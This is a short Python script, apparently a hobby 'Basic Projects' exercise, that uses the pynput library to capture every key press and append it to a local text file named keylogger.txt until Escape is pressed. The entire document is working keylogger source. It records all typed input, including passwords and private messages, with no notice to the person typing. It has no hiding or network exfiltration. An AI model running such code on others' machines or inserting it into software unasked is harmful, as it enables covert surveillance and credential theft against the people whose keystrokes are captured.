from pynput import keyboard

def keystroke(key):
    file = open(r"c:\Users\Harun\Desktop\Python_Projects\Basic Projects\keylogger.txt", "a", encoding="UTF-8")

    if (key == keyboard.Key.enter):
        file.write("\n")
    elif(key == keyboard.Key.space):
        file.write(" ")
    elif (key == keyboard.Key.esc):
        file.close()
        return False
    else:
        file.write(str(key))

with keyboard.Listener(on_press=keystroke) as listener:
    listener.join()
